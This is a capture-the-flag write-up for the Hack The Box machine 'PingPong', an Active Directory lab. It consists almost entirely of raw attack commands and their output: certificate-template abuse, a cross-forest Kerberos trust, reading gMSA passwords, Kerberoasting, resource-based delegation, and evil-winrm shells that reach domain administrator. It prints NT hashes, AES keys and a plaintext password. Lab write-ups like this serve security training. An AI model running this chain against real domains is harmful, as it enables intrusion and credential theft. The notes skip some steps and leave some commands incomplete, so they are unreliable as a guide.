---
tags:
title: PingPong - Insane (HTB)
permalink: /PingPong-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon
```bash
As is common in real life pentests, you will start the PingPong box with credentials for the following account c.roberts / AssumedBreach123
```

```bash 
rustscan --addresses "10.129.39.133" --top
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: allowing you to send UDP packets into the void 1200x faster than NMAP

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 20380'.
Open 10.129.39.133:88
Open 10.129.39.133:593
Open 10.129.39.133:445
Open 10.129.39.133:135
Open 10.129.39.133:53
Open 10.129.39.133:389
Open 10.129.39.133:636
Open 10.129.39.133:464
Open 10.129.39.133:2179
Open 10.129.39.133:139
Open 10.129.39.133:3268
Open 10.129.39.133:3269
Open 10.129.39.133:5985
Open 10.129.39.133:9389
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-27 12:34 -03
Initiating Ping Scan at 12:34
Scanning 10.129.39.133 [4 ports]
Completed Ping Scan at 12:34, 0.51s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:34
Completed Parallel DNS resolution of 1 host. at 12:34, 3.74s elapsed
DNS resolution of 1 IPs took 3.74s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 12:34
Scanning 10.129.39.133 [14 ports]
Discovered open port 5985/tcp on 10.129.39.133
Discovered open port 464/tcp on 10.129.39.133
Discovered open port 2179/tcp on 10.129.39.133
Discovered open port 593/tcp on 10.129.39.133
Discovered open port 636/tcp on 10.129.39.133
Discovered open port 3268/tcp on 10.129.39.133
Discovered open port 88/tcp on 10.129.39.133
Discovered open port 3269/tcp on 10.129.39.133
Discovered open port 135/tcp on 10.129.39.133
Discovered open port 139/tcp on 10.129.39.133
Discovered open port 53/tcp on 10.129.39.133
Discovered open port 389/tcp on 10.129.39.133
Discovered open port 9389/tcp on 10.129.39.133
Discovered open port 445/tcp on 10.129.39.133
Increasing send delay for 10.129.39.133 from 0 to 5 due to 11 out of 16 dropped probes since last increase.
Completed SYN Stealth Scan at 12:34, 4.93s elapsed (14 total ports)
Nmap scan report for 10.129.39.133
Host is up, received reset ttl 63 (0.54s latency).
Scanned at 2026-04-27 12:34:46 -03 for 5s

PORT     STATE SERVICE          REASON
53/tcp   open  domain           syn-ack ttl 63
88/tcp   open  kerberos-sec     syn-ack ttl 63
135/tcp  open  msrpc            syn-ack ttl 63
139/tcp  open  netbios-ssn      syn-ack ttl 63
389/tcp  open  ldap             syn-ack ttl 63
445/tcp  open  microsoft-ds     syn-ack ttl 63
464/tcp  open  kpasswd5         syn-ack ttl 63
593/tcp  open  http-rpc-epmap   syn-ack ttl 63
636/tcp  open  ldapssl          syn-ack ttl 63
2179/tcp open  vmrdp            syn-ack ttl 63
3268/tcp open  globalcatLDAP    syn-ack ttl 63
3269/tcp open  globalcatLDAPssl syn-ack ttl 63
5985/tcp open  wsman            syn-ack ttl 63
9389/tcp open  adws             syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds
           Raw packets sent: 31 (1.336KB) | Rcvd: 21 (928B)
```

```bash
nxc smb 10.129.39.133 -u c.roberts -p 'AssumedBreach123' -k --generate-krb5-file ./krb5.conf
SMB         10.129.39.133   445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.39.133   445    dc1              [+] krb5 conf saved to: ./krb5.conf
SMB         10.129.39.133   445    dc1              [+] Run the following command to use the conf file: export KRB5_CONFIG=./krb5.conf
SMB         10.129.39.133   445    dc1              [+] ping.htb\c.roberts:AssumedBreach123
```

```bash
rusthound -d "ping.htb" -k -u "c.roberts"@"ping.htb" -p "AssumedBreach123" --zip -f dc1.ping.htb
---------------------------------------------------
Initializing RustHound at 21:00:28 on 04/27/26
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2026-04-28T00:00:28Z INFO  rusthound] Verbosity level: Info
[2026-04-28T00:00:32Z INFO  rusthound::ldap] Connected to PING.HTB Active Directory!
[2026-04-28T00:00:32Z INFO  rusthound::ldap] Starting data collection...
[2026-04-28T00:00:36Z INFO  rusthound::ldap] All data collected for NamingContext DC=ping,DC=htb
[2026-04-28T00:00:36Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2026-04-28T00:00:36Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2026-04-28T00:00:36Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2026-04-28T00:00:36Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2026-04-28T00:00:36Z INFO  rusthound::json::maker] 28 users parsed!
[2026-04-28T00:00:36Z INFO  rusthound::json::maker] 65 groups parsed!
[2026-04-28T00:00:36Z INFO  rusthound::json::maker] 1 computers parsed!
[2026-04-28T00:00:36Z INFO  rusthound::json::maker] 1 ous parsed!
[2026-04-28T00:00:36Z INFO  rusthound::json::maker] 1 domains parsed!
[2026-04-28T00:00:36Z INFO  rusthound::json::maker] 3 gpos parsed!
[2026-04-28T00:00:36Z INFO  rusthound::json::maker] 21 containers parsed!
[2026-04-28T00:00:36Z INFO  rusthound::json::maker] .//20260427210036_ping-htb_rusthound.zip created!

RustHound Enumeration Completed at 21:00:36 on 04/27/26! Happy Graphing!
```

```bash
certipy req -u 'c.roberts@ping.htb' -p 'AssumedBreach123' -k -ca 'PING-DC1-CA' -target dc1.ping.htb -template 'TemporaryWinRM' -dc-host dc1.ping.htb
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'C.Roberts@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Saving certificate and private key to 'c.roberts.pfx'
[*] Wrote certificate and private key to 'c.roberts.pfx'
```

```bash
 certipy auth -pfx c.roberts.pfx -dc-ip 10.129.39.133
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'C.Roberts@ping.htb'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Using principal: 'c.roberts@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'c.roberts.ccache'
File 'c.roberts.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'c.roberts.ccache'
[*] Trying to retrieve NT hash for 'c.roberts'
[*] Got hash for 'c.roberts@ping.htb': aad3b435b51404eeaad3b435b51404ee:2475be69d40e815588a85fd89c7a439d
```

```bash
rusthound-ce -d pong.htb -f dc2.pong.htb -k -c All --zip

```

```bash
impacket-getTGT 'PING.HTB/c.roberts:AssumedBreach123' -dc-ip 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.roberts.ccache


export KRB5CCNAME=$PWD/c.roberts.ccache                                                                                                                                                                                                                                                                                 
 kvno -S ldap dc2.pong.htb                                                                                                                                                                                                                                                                                               

nxc ldap dc2.pong.htb -d ping.htb -u c.roberts -k --use-kcache --gmsa
LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:ping.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc2.pong.htb    389    DC2              [+] ping.htb\ from ccache 
LDAP        dc2.pong.htb    389    DC2              [*] Getting GMSA Passwords
LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           NTLM: 4b85a2a049588810c1267e4018b07a07     PrincipalsAllowedToReadPassword: gMSA Managers
```


trust.conf
```bash
[libdefaults]
    default_realm = PING.HTB
    dns_lookup_kdc = false
    dns_lookup_realm = false

[realms]
    PING.HTB = {
        kdc = dc1.ping.htb
        admin_server = dc1.ping.htb
    }
    PONG.HTB = {
        kdc = dc2.pong.htb
        admin_server = dc2.pong.htb
    }

[domain_realm]
    .ping.htb = PING.HTB
    ping.htb = PING.HTB
    .pong.htb = PONG.HTB
    pong.htb = PONG.HTB
```

```bash
# Limpia por si acaso
kdestroy
export KRB5_CONFIG=$(pwd)/trust.conf

# 1. Obten tu ticket inicial en PING
kinit c.roberts@PING.HTB

# 2. Pide el ticket de servicio para el recurso en PONG
# Gracias al trust, el KDC de PING te dará un "Cross-Domain TGT"
kvno ldap/dc2.pong.htb@PONG.HTB
kdestroy: No credentials cache found while destroying cache
Password for c.roberts@PING.HTB:
ldap/dc2.pong.htb@PONG.HTB: kvno = 6
```

```bash
bloodyAD -d pong.htb -u c.roberts -k ccache=$(pwd)/c.roberts.ccache --host dc2.pong.htb --dc-ip 192.168.2.2 add genericAll 'gMSA Managers' 'S-1-5-21-750635624-2058721901-1932338391-2617'
```

```bash
bloodyAD --host dc2.pong.htb -k kdc=10.129.39.133 -d ping.htb -u c.roberts set object "GMSA Managers" groupType -v -2147483640
[+] GMSA Managers's groupType has been updated
```

```bash
bloodyAD --host dc2.pong.htb -k kdc=10.129.39.133 -d ping.htb -u c.roberts set object "CN=gMSA Managers,CN=Users,DC=pong,DC=htb" groupType -v -2147483640 
```

```bash
ldap dc2.pong.htb -d ping.htb -u c.roberts -k --use-kcache --gmsa                                                                                                                                        7:19:34
LDAP        dc2.pong.htb    389    DC2              [] None (name:DC2) (domain:ping.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc2.pong.htb    389    DC2              [+] ping.htb\ from ccache 
LDAP        dc2.pong.htb    389    DC2              [] Getting GMSA Passwords
LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           NTLM: 4b85a2a049588810c1267e4018b07a07     PrincipalsAllowedToReadPassword: gMSA Managers
```

```bash
ldeep ldap -d pong.htb -u c.roberts -k -s ldap://192.168.2.2 gmsa
```

```bsah
Pong_gMSA$:nthash:4b85a2a049588810c1267e4018b07a07
Pong_gMSA$:aes128-cts-hmac-sha1-96:c48ae0b9895ebd9e1fe44ce34d3b696e
Pong_gMSA$:aes256-cts-hmac-sha1-96:9a3d021763ac0f2ceb3b629eddf92fee758a3ba6fce28269a2d35a3e252e539a
Pong_gMSA$:reader:gMSA Managers (group)
impacket-getTGT -dc-ip dc2.pong.htb \
  -aesKey 9a3d021763ac0f2ceb3b629eddf92fee758a3ba6fce28269a2d35a3e252e539a \
  'pong.htb/Pong_gMSA$'
login winrm
get ticket > login winrm > get pass at C:\Users\Pong_gMSA$\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
getTGT.py pong.htb/c.carlssen:'A()DUJ!@414'

export KRB5CCNAME=c.carlssen.ccache

evil-winrm -i dc2.pong.htb -r PONG.HTB
```


```bash
getTGT.py pong.htb/c.carlssen:'A()DUJ!@414'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in c.carlssen.ccache
[Apr 27, 2026 - 22:56:56 (-03)] exegol-htb_priv PingPong # export KRB5CCNAME=c.carlssen.ccache
```

```bash
evil-winrm -i dc2.pong.htb -r PONG.HTB

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Carlssen\Documents> type ../desktop/user.txt
8e1f3ddc60ebbc0b227d12022c030f25
```

```bash
GetUserSPNs.py pong.htb/c.carlssen:'A()DUJ!@414' -k -dc-host dc2.pong.htb -request
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName   Name     MemberOf  PasswordLastSet             LastLogon                   Delegation
---------------------  -------  --------  --------------------------  --------------------------  ----------
mssqlsvc/dc2.pong.htb  svc_sql            2026-01-16 11:25:30.915079  2026-04-27 19:23:25.505144



$krb5tgs$18$svc_sql$PONG.HTB$*pong.htb/svc_sql*$839c6c308d1b018c4211e4d6$686620160f242026e11de2ade2c868f4e59c31ecf02e780dae35e84f89fee6d3049dfb37741956487d859968328d8a69c1c78c6391e6a0dce367e5f472d71cdbd0c13627d9fc325372d502d6d72184eb34a2eb2cd3ec80b354894323658ce5658f4972451de54c0c3ba97c548070a57a2da3efc5bee0d35e1d7549d71c21ed9f29fc7cdc977f085c06a6dc48b765ea9eabb83d5c7d81fb292fc57aa6f7e707025b425862782c884428d5468210002d7f4343a6da1b37ea389bcda71326261eb35b5cd6b8ffdc14f2de27fb246548fbd3b2b4325f9ffa41174b01f468efcdf78ef74b8cfc086b293a6fe0fb666f5c54896d7a35d19a40f585325502765d84e5a434b146e44fb6f57c0b54edaf628908925dce2b3b0e7b67ae8f95e1d745cf4c19f6f8f95579a2dd4add8ba6b6fa63ccf3463a64bdf7fe6cf3bff4d74f2e0808b5274808b2e8d969e73de96aae930fa3385bc5cb58ed41298898f9d2bed2564de2509327a0a9101ab86ae50fcb08affd7fc5ec40d59d9b8fa45f9f8c5cdb9b2802695c03c0aec6b7587b46182fc4e190363db9fc872e2fa6c186fa6f32d93a04f86e4fd822f350c73811101cdd82245cc8ef27cfe09f52011731bd4d44a9dd163d2957d2032c75e8d53fcf59abf1be5502923326ccfa4c66bb3eb59eb4ed1125ce35e0711b22ae56c00bc53ea4aad0d583a3b2d1eeda3ef6627d3c64cee876f9a23f026b49e9bcfba4f1d0194336b942395e884d417f56aa3892b955b79cbc780325527a7aa2fcf96714141240dd35ebb7fe3631bddcb0deb9aab35aa39d3d84e2302a822bbbc5abf8fdb65f4a34d094504fdd073cb657802ad21195fa597efe1192d92e8321f653b291856015f551e3cbbb905937ca8f30307e3fa2937fface863b9d5c414cc32d7d267246c92acf801279b9d53c4ee1f8441549bcc91c9bba2856222057d3bf299cb1b52cd0b2bc6adafcc43a8d14e59776751dcea382feed2484cccb808e3f389a8cf6ae5b60a0f742728f9ad79862f43655a5205a56b980274397e64439cac193df51a253304f7ad51ba36ccb7ea78e0a758140fd2be5aaa28f62e5e137749b175ea53ad2aea8563ffba14304138946a578eaf73f3bc31c483c277340c87c4e03ceddff6706cda6ba3c147c700c9ebc41120d48b17436dffd011309cf51a9178c95540d4055f2d938405121fb60e22fa63fca6b6be5194fe9222647c537431deed2457ee08cb822808bda001d1d1918523be3d07184c036601750876800c1d067552320f15d6a4bfc9a798d10b5397f7b9fabb6d3afd3ba060373b06cc5e3346bdd398d851d51c4f796956c8b889f994a54d8ff481987887cdb1d195e4a16da7f3a3a1a3f51104fe47ccf84537813f9fe867e16a1f282821c2cdc431c9b5523a87e8e0a85de3e203a7a690a409182c98c5e8261e23993c6bd20a96b418fc5b97e8f1efb9ec79f9b4d9f159f05fef12534f62d2e
```

```bash
bloodyAD -d pong.htb -u c.carlssen -k --host dc2.pong.htb --dc-ip 192.168.2.2 add rbcd svc_sql 'pong_gmsa$'
[!] No security descriptor has been returned, a new one will be created
[+] pong_gmsa$ can now impersonate users on svc_sql via S4U2Proxy
```





shell admin dc1

```bash
getTGT.py 'PING.HTB/Administrator' -aesKey fe77eaeb511e1cf9accc7cae69321ebb80ba330c4f115b34702923f2714d4496
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Administrator.ccache
[Apr 27, 2026 - 23:06:11 (-03)] exegol-htb_priv PingPong # export KRB5CCNAME=Administrator.ccache



evil-winrm -i dc1.pIng.htb -r PING.HTB

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
db1b26a19dd462adfe86626172e554ef
```